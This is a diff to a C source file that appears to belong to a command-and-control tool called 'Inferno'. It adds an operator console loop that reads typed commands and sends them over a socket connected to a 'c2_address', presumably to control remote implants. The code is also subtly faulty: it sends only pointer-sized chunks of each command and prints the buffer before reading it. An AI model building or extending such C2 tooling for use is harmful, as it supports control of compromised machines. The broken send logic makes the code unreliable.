@@ -84,11 +84,31 @@ void networking() {
     int inferno_connect = connect(inferno_socket, (struct sockaddr *) &c2_address, sizeof(c2_address));
     printf("Connected");
     
+
+    while (1) {
+
+    static char input[1024];
+    printf("%s\n\n", input);
+    printf("[ASX]@[INFERNO]> ");
+
+    if (fgets(input, sizeof(input), stdin) == NULL){
+        perror("fgets failed");
+        exit(EXIT_FAILURE);
+    }
+
+    input[strcspn(input, "\n")] = '\0';
+    
+    if (strcmp(input, "exit") == 0) {
+         puts("\nClosing c2 and exiting...");
+         exit(EXIT_SUCCESS);
+    }
+
     //commands
     char *instruction;
-    instruction = command();
+    instruction = input;
     puts(instruction);
     
     //sending
     ssize_t inferno_send = send(inferno_socket, instruction, sizeof(instruction), 0);
+    }
 }
